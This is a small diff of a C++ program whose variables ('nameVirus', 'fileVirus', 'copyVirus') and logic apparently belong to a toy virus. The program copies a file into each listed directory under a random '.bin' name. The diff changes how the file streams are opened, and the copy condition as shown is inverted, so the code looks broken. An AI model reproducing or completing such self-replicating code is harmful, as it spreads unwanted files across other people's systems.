@@ -8,7 +8,7 @@
 #include <iostream>
 
 using namespace std;
-namespace fs = std::filesystem;
+
 //variables
 regex correctFile("(a)+([0-9]?)+(.*)");
 // detect archives
@@ -63,9 +63,9 @@ void writeFiles(vector<string> files)
           // generate the name
           string nameVirus = (files[i] + "/a" + to_string(rand()) + ".bin");
           // get the file
-          ifstream fileVirus(file, ios::binary);
+          ifstream fileVirus(file);
           // create the file
-          ofstream copyVirus(nameVirus, ios::binary);
+          ofstream copyVirus(nameVirus);
           if (!fileVirus.is_open())
             copyVirus << fileVirus.rdbuf(); // copy the file
 
